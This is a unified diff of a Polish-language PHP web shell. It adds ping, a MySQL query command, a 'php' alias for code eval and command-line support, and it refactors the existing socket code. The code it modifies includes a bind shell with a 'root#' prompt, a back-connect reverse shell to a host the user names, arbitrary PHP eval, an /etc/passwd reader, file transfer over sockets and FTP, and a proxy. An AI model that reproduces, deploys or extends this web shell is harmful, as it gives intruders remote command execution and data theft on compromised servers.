@@ -242,12 +242,16 @@ CONTENT;
 	 * Pobieranie nazwy hosta i portu
 	 *
 	 * @access private
-	 * @param  integer $sValue Host:port
-	 * @return array           Host i port
+	 * @param  integer $sHost Host / Host:port
+	 * @return array          Host i port
 	 */
-	private function getHost( $sValue )
+	private function getHost( $sHost )
 	{
-		list( $sHost, $iPort ) = explode( ':', $sValue );
+		$iPort = 0;
+		if( strpos( $sHost, ':' ) !== FALSE )
+		{
+			list( $sHost, $iPort ) = explode( ':', $sHost );
+		}
 
 		return array( $sHost, (int) $iPort );
 	}
@@ -311,6 +315,30 @@ HELP;
 		}
 
 		return htmlspecialchars( $this -> sArgv );
+	}
+
+	/**
+	 * Komenda - ping
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandPing()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+ping - Odpowiedź "pong"
+
+	Użycie:
+		ping
+HELP;
+		}
+
+		return 'pong';
 	}
 
 	/**
@@ -502,7 +530,7 @@ HELP;
 		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
-eval - Wykonanie kodu PHP
+eval, php - Wykonanie kodu PHP
 
 	Użycie:
 		eval skrypt_php
@@ -569,7 +597,7 @@ HELP;
 		/**
 		 * Polaczenie z hostem
 		 */
-		if( ( $rSock = fsockopen( $aHost[0], $aHost[1], $iErrorNo = NULL, $sErrorStr = NULL, 5 ) ) === FALSE )
+		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
 		{
 			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
 		}
@@ -577,7 +605,7 @@ HELP;
 		/**
 		 * File
 		 */
-		if( ( $rFile = fopen( $this -> aArgv[1], 'r' ) ) === FALSE )
+		if( ! ( $rFile = fopen( $this -> aArgv[1], 'r' ) ) )
 		{
 			return sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] );
 		}
@@ -639,7 +667,7 @@ HELP;
 		/**
 		 * Polaczenie z hostem
 		 */
-		if( ( $rSock = fsockopen( $aHost[0], $aHost[1], $iErrorNo = NULL, $sErrorStr = NULL, 5 ) ) === FALSE )
+		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
 		{
 			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
 		}
@@ -651,7 +679,7 @@ HELP;
 		 */
 		for(;;)
 		{
-			if( ( $sCmd =  fread( $rSock, 1024 ) ) !== FALSE )
+			if( ( $sCmd = fread( $rSock, 1024 ) ) !== FALSE )
 			{
 				$sCmd = rtrim( $sCmd );
 				if( $sCmd === ':exit' )
@@ -719,7 +747,7 @@ HELP;
 		/**
 		 * Tworzenie socketa
 		 */
-		if( ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp ' ) ) ) === FALSE )
+		if( ! ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp ' ) ) ) )
 		{
 			return 'Nie można utworzyć połączenia';
 		}
@@ -727,12 +755,12 @@ HELP;
 		/**
 		 * Bindowanie
 		 */
-		if( ( socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) ) === FALSE )
+		if( ! ( socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) ) )
 		{
 			return sprintf( 'Nie można zbindować "0.0.0.0:%d"', $this -> aArgv[0] );
 		}
 
-		if( ( socket_listen( $rSock ) ) === FALSE )
+		if( ! ( socket_listen( $rSock ) ) )
 		{
 			return sprintf( 'Nie można nasłuchiwać "0.0.0.0:%d"', $this -> aArgv[0] );
 		}
@@ -747,7 +775,7 @@ HELP;
 			/**
 			 * Klient
 			 */
-			if( ! $rClient && ! ( $rClient = socket_accept( $rSock ) ) )
+			if( ! ( $rClient = socket_accept( $rSock ) ) )
 			{
 				usleep( 10000 );
 			}
@@ -765,20 +793,23 @@ HELP;
 				/**
 				 * Komenda
 				 */
-				if( ( $sCmd = rtrim( socket_read( $rClient, 1024 ) ) ) !== FALSE )
+				for(;;)
 				{
-					if( $sCmd === ':exit' )
+					if( ( $sCmd = rtrim( socket_read( $rClient, 1024, PHP_NORMAL_READ ) ) ) )
 					{
-						socket_write( $rClient, "\r\nDobranoc ;)" );
-						socket_close( $rSock );
-						socket_close( $rClient );
+						if( $sCmd === ':exit' )
+						{
+							socket_write( $rClient, "\r\nDobranoc ;)" );
+							socket_close( $rSock );
+							socket_close( $rClient );
 
-						echo 'Zakończono bindowanie';
-						exit ;
+							echo 'Zakończono bindowanie';
+							exit ;
+						}
+
+						socket_write( $rClient, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
+						socket_write( $rClient, "\r\nroot#" );
 					}
-
-					socket_write( $rClient, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
-					socket_write( $rClient, "\r\nroot#" );
 				}
 			}
 		}
@@ -824,7 +855,7 @@ HELP;
 		/**
 		 * Polaczenie z hostem
 		 */
-		if( ( $rSock = fsockopen( $aHost[0], $aHost[1], $iErrorNo = NULL, $sErrorStr = NULL, 1 ) ) === FALSE )
+		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
 		{
 			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] ) );
 		}
@@ -832,7 +863,7 @@ HELP;
 		/**
 		 * File
 		 */
-		if( ( $rFile = fopen( $this -> aArgv[1], 'w' ) ) === FALSE )
+		if( ! ( $rFile = fopen( $this -> aArgv[1], 'w' ) ) )
 		{
 			return htmlspecialchars( sprintf( 'Nie można odczytać pliku "%s"', $this -> aArgv[1] ) );
 		}
@@ -895,7 +926,7 @@ HELP;
 		/**
 		 * Ustanawianie polaczenia
 		 */
-		if( ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) === FALSE )
+		if( ! ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) )
 		{
 			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
 		}
@@ -927,6 +958,137 @@ HELP;
 		ftp_close( $rFtp );
 
 		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie wgrany an FTP', $this -> aArgv[2] ) );
+	}
+
+
+	/**
+	 * Komenda - mysql
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandMysql()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<HELP
+mysql - Połączenie z bazą MySQL
+
+	Użycie:
+		mysql host:port login@hasło nazwa_bazy komenda
+
+	Przykład:
+		mysql localhost:3306 test@test mysql "SELECT 1"
+HELP;
+		}
+
+		$aHost = $this -> getHost( $this -> aArgv[0] );
+
+		/**
+		 * Domyslny port to 3306
+		 */
+		if( $aHost[1] === 0 )
+		{
+			$aHost[1] = 3306;
+		}
+
+		/**
+		 * login@pass
+		 */
+		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1], 2 );
+
+		/**
+		 * PDO jest wymagane
+		 */
+		if( ! extension_loaded( 'pdo' ) )
+		{
+			return 'Brak rozszerzenia PDO';
+		}
+
+		try
+		{
+			/**
+			 * Polaczenie do bazy
+			 */
+			$oPdo = new PDO( sprintf( 'mysql:host=%s;port=%d;dbname=%s', $aHost[0], $aHost[1], $this -> aArgv[2] ), $sUsername, $sPassword );
+
+			$oSql = $oPdo -> query( $this -> aArgv[3] );
+
+			$aData = $oSql -> fetchAll( PDO::FETCH_ASSOC );
+
+			$oSql -> closeCursor();
+
+			if( $aData === array() )
+			{
+				return 'Brak wyników';
+			}
+
+			/**
+			 * $aDataLength przechowuje dlugosc najdluzszego ciagu w danej kolumnie
+			 */
+			$aDataLength = $aData[0];
+
+			/**
+			 * Domyslnie dlugosc pola to dlugosc kolumny
+			 */
+			array_walk( $aDataLength, function( & $sVal, $sKey )
+				{
+					$sVal = strlen( $sKey );
+				}
+			);
+
+			/**
+			 * Obliczanie dlugosci ciagu
+			 */
+			foreach( $aData as $aRow )
+			{
+				foreach( $aRow as $sColumn => $sValue )
+				{
+					if( ( $iLength = strlen( $sValue ) ) > $aDataLength[ $sColumn ] )
+					{
+						$aDataLength[ $sColumn ] = $iLength;
+					}
+				}
+			}
+
+			$sOutput = NULL;
+
+			$sLines = str_repeat( '-', array_sum( $aDataLength ) + 1 + 3 * count( $aDataLength ) ) . "\n";
+
+			$sOutput .= $sLines;
+			/**
+			 * Nazwy kolumn
+			 */
+			foreach( $aDataLength as $sColumn => $sValue )
+			{
+				$sOutput .= '| ' . str_pad( $sColumn, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
+			}
+			$sOutput .= "|\n" . $sLines;
+
+			/**
+			 * Dane
+			 */
+			foreach( $aData as $aRow )
+			{
+				foreach( $aRow as $sColumn => $sValue )
+				{
+					$sOutput .= '| ' . str_pad( $sValue, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
+				}
+				$sOutput .= "|\n";
+			}
+
+			return htmlspecialchars( $sOutput . $sLines );
+		}
+		/**
+		 * Wyjatek
+		 */
+		catch( PDOException $oException )
+		{
+			return sprintf( 'Wystąpił błąd: %s', $oException -> getMessage() );
+		}
 	}
 
 	/**
@@ -968,7 +1130,7 @@ HELP;
 		/**
 		 * Ustanawianie polaczenia
 		 */
-		if( ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) === FALSE )
+		if( ! ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) )
 		{
 			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> aArgv[0] ) );
 		}
@@ -1075,11 +1237,23 @@ HELP;
 					 */
 					if( $this -> bWindows )
 					{
-						$sOutput .= sprintf( "%s %11d %s %s\n", ( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ), $oFile -> getSize(), date( 'Y-m-d h:i', $oFile -> getCTime() ), $oFile -> {$sFileName}() );
+						$sOutput .= sprintf( "%s %11d %s %s\n",
+							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
+							$oFile -> getSize(), date( 'Y-m-d h:i',
+								$oFile -> getCTime() ),
+							$oFile -> {$sFileName}()
+						);
 					}
 					else
 					{
-						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\n", ( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ), substr( sprintf( '%o', $oFile -> getPerms() ), -4 ), $this -> getOwnerById( $oFile -> getOwner() ), $this -> getGroupById( $oFile -> getGroup() ), $oFile -> getSize(), date( 'Y-m-d h:i', $oFile -> getCTime() ), $oFile -> {$sFileName}() );
+						$sOutput .= sprintf( "%s%s %-10s %-10s %11d %s %s\n",
+							( ( $oFile -> getType() === 'file' ) ? '-' : 'd' ),
+							substr( sprintf( '%o', $oFile -> getPerms() ), -4 ),
+							$this -> getOwnerById( $oFile -> getOwner() ),
+							$this -> getGroupById( $oFile -> getGroup() ),
+							$oFile -> getSize(), date( 'Y-m-d h:i',
+							$oFile -> getCTime() ), $oFile -> {$sFileName}()
+						);
 					}
 				}
 				else
@@ -1540,7 +1714,9 @@ Changelog:
 
 2011-05-20
 ----------
-* dodano komendę <strong>proxy</strong>
+* dodano komendy: <strong>proxy</strong>, <strong>ping</strong>, <strong>mysql</strong>
+* <strong>php</strong> jest aliasem dla <strong>eval</strong>
+* wsparcie dla CLI
 
 2011-05-16
 ----------
@@ -1556,7 +1732,12 @@ Changelog:
 HELP;
 	}
 
-
+	/**
+	 * Komenda - proxy
+	 *
+	 * @access private
+	 * @return string
+	 */
 	private function getCommandProxy()
 	{
 		/**
@@ -1611,16 +1792,6 @@ HELP;
 		}
 
 		/**
-		 * Ustawianie dyrektyw
-		 */
-		if( ! $this -> bSafeMode )
-		{
-			ini_set( 'output_buffering', 0 );
-			ini_set( 'zlib.output_compression', 0 );
-			ini_set( 'implicit_flush', 1 );
-		}
-
-		/**
 		 * Ignorowanie obrazkow: .jpg .gif .png .ico .psd .bmp
 		 */
 		$bIgnoreImages = in_array( 'i', $this -> aOptv );
@@ -1654,6 +1825,8 @@ HELP;
 			return "Nie można nasłuchiwać\n";
 		}
 
+		ob_start();
+
 		header( 'Content-Type: text/plain', TRUE );
 
 		echo "Proxy zostało uruchomione\n\n";
@@ -1663,7 +1836,7 @@ HELP;
 			/**
 			 * Klient
 			 */
-			if( ( $rClient = @ socket_accept( $rSock ) ) === FALSE )
+			if( ! ( $rClient = @ socket_accept( $rSock ) ) )
 			{
 				/**
 				 * Zeby obciazenie procesora nie bylo 100%
@@ -1768,7 +1941,7 @@ HELP;
 			/**
 			 * Statystyki
 			 */
-			printf( "%-90.90s ", $aGet[2] );
+			printf( "%-80.80s ", $aGet[2] );
 
 			/**
 			 * Ignorowanie obrazkow
@@ -1835,7 +2008,7 @@ HELP;
 					 * Jezeli pobieramy plik i nagle nacisniemy "Anuluj", zapobiega to
 					 * blokowaniu skryptu
 					 */
-					if( socket_write( $rClient, $sTmp ) === FALSE )
+					if( ! socket_write( $rClient, $sTmp )  )
 					{
 						break ;
 					}
@@ -1858,12 +2031,16 @@ HELP;
 			 * Rozlaczenie klienta
 			 */
 			socket_close( $rClient );
+
+			ob_flush();
+			flush();
 		}
 
 		/**
 		 * Zamykanie socketa (chyba a raczej na pewno sie nigdy nie zamknie)
 		 */
 		socket_close( $rSock );
+		ob_end_flush();
 		exit ;
 	}
 
@@ -1928,7 +2105,7 @@ HELP;
 			$sCommand = substr_replace( $sCommand, str_repeat( ' ', $iDashPos - $aCommandsPos[ $iKey ] ), $aCommandsPos[ $iKey ], 0 );
 		}
 
-		return implode( "\n", $aCommandsInfo ) . "\n\n\n\n" . $sOutput;
+		return substr( implode( "\n", $aCommandsInfo ) . "\n\n\n\n" . $sOutput, 0, -3 );
 	}
 
 	/**
@@ -1952,13 +2129,27 @@ HELP;
 		/**
 		 * Domyslna komenda to :ls -l sciezka_do_katalogu
 		 */
-		if( ( $sCmd === NULL ) && ! Request::isPost() )
+		if( $sCmd === NULL )
 		{
-			$sCmd = ':ls -l ' . dirname( __FILE__ );
-		}
-		else if( $sCmd === NULL )
-		{
-			$sCmd = (string) Request::getPost( 'cmd' );
+			if( PHP_SAPI === 'cli' )
+			{
+				/**
+				 * Zmienne globalne to zlo ;), to powinno zostac przekazane
+				 * jako parametr w konstruktorze ... ale coz ...
+				 */
+				$aArgv = $GLOBALS['argv'];
+				array_shift( $aArgv );
+
+				$sCmd = implode( $aArgv, ' ' );
+			}
+			else if( ! Request::isPost() )
+			{
+				$sCmd = ':ls -l ' . dirname( __FILE__ );
+			}
+			else
+			{
+				$sCmd = (string) Request::getPost( 'cmd' );
+			}
 		}
 
 		/**
@@ -2034,6 +2225,9 @@ HELP;
 				case 'echo':
 					$sConsole = $this -> getCommandEcho();
 					break ;
+				case 'ping':
+					$sConsole = $this -> getCommandPing();
+					break ;
 				case 'bind':
 					$sConsole = $this -> getCommandBind();
 					break ;
@@ -2042,7 +2236,11 @@ HELP;
 					$sConsole = $this -> getCommandBackConnect();
 					break ;
 				case 'eval':
+				case 'php':
 					$sConsole = $this -> getCommandEval();
+					break ;
+				case 'mysql':
+					$sConsole = $this -> getCommandMysql();
 					break ;
 				case 'etcpasswd':
 					$sConsole = $this -> getCommandEtcPasswd();
@@ -2146,7 +2344,7 @@ HELP;
 			}
 			else
 			{
-				echo 'Nic sobie nie porobisz, wszystkie funkcje systemowe poblokowane';
+				echo 'Nic sobie nie porobisz, wszystkie funkcje systemowe są poblokowane !!!';
 			}
 
 			$sData = ob_get_contents();
@@ -2159,7 +2357,7 @@ HELP;
 			$sConsole = 'Safe mode jest włączone, więc <strong>exec</strong>, <strong>shell_exec</strong>, <strong>passthru</strong>, <strong>system</strong> i <strong>fopen</strong> nie zadziałają';
 		}
 
-		if( $bRaw )
+		if( $bRaw || ( PHP_SAPI === 'cli' ) )
 		{
 			return strip_tags( $sConsole );
 		}
@@ -2249,14 +2447,7 @@ for( $i = 0; $i < ob_get_level(); $i++ )
 	ob_end_flush();
 }
 
-ob_start();
-
 $oShell = new Shell();
 echo $oShell -> get();
-
-if( ob_get_length() > 0 )
-{
-	ob_end_flush();
-}
 
 exit ;
